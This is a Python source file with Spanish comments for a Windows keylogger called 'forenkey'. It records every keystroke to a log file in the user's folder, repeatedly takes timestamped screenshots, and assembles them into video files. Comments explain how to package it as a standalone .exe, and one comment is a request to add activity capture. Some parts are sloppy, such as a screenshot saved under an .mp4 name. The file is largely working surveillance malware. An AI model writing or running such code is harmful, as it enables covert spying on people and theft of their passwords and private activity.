
"# forenkey" 
# genera codigo para un keylogger en python
# para ejecutarlo en windows
# se debe convertir a .exe
# con pyinstaller
# pyinstaller --onefile forenkey.py

#Use pyWinhook instead of pyHook
#pyHook is not supported in Python 3.x
#pyWinhook is supported in Python 3.x
#pyWinhook is a fork of pyHook

import pyWinhook, pythoncom, sys, logging
import os
import pyautogui
import moviepy
import pygetwindow as gw

# ubica el archivo log.txt en la carpeta de este usuario

file_log = 'C:\\users\\%s\\log.txt' % os.getlogin()
#ubica el archivo log.txt en la carpeta raiz del disco C
#file_log = 'C:\\log.txt'

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
# Añade una func que guarde capturas de pantallas cada 30 segundos durante 10 minutos y guardelas en la carpeta del usuario con el nombre en formato AAAA-MM-DD-HH-MM-SS.png, tambien debe almacenar cada minuto durante 10 minutos el nombre de la ventana activa en el mismo archivo log.txt y un video de 15 segundos de lo que se esta haciendo en el computador en el mismo directorio con el nombre en formato AAAA-MM-DD-HH-MM-SS.mp4, para capturar el video usa la libreria moviepy 1.0.3 y para capturar la ventana activa usa la libreria pygetwindow 0.0.9





    #video.save('C:\\users\\%s\\%s.mp4' % (os.getlogin(), pyautogui.datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")))

import os
import pyautogui
import moviepy.editor

def screenshotVideodateAndTime():
    screenshot = pyautogui.screenshot()
    filename = os.path.join('C:\\users', os.getlogin(), pyautogui.datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S") + '.png')
    screenshot.save(filename)
    clip = moviepy.editor.ImageSequenceClip([filename] * 300, fps=30)
    auxvideofile = pyautogui.datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S") + '.mp4'
    clip.write_videofile(os.path.join('C:\\users', os.getlogin(), auxvideofile ))
    #llama a una funcion que comrima el vodeo que acabas de guardar
    compressVideo(os.path.join('C:\\users', os.getlogin(), auxvideofile))


    return True

def compressVideo(filename):
    clip = moviepy.editor.VideoFileClip(filename)
    clip_resized = clip.resize(height=360) # make the height 360px ( According to moviePy documenation The width is then computed so that the width/height ratio is conserved.)
    clip_resized.write_videofile(filename.replace('.mp4', '_compressed.mp4')) # the width is 720p by default

    return True




def screenshotandvideo():
    screenshot = pyautogui.screenshot()
    screenshot.save('C:\\users\\%s\\%s.png' % (os.getlogin(), pyautogui.datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")))
    video = pyautogui.screenshot()
    video.save('C:\\users\\%s\\%s.mp4' % (os.getlogin(), pyautogui.datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")))


    return True


def screenshotdateAndTime():
    screenshot = pyautogui.screenshot()
    screenshot.save('C:\\users\\%s\\%s.png' % (os.getlogin(), pyautogui.datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")))
    return True

now = pyautogui.datetime.datetime.now()
# 10 minutos = 600 segundos
# 30 segundos = 30 segundos
# 20 capturas de pantalla
for i in range(20):
    pyautogui.time.sleep(30)
    screenshotVideodateAndTime()
    
    print(i)


# 
def screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save('C:\\users\\%s\\screenshot.png' % os.getlogin())
    return True


# crea un hook manager    
hooks_manager = pyWinhook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()


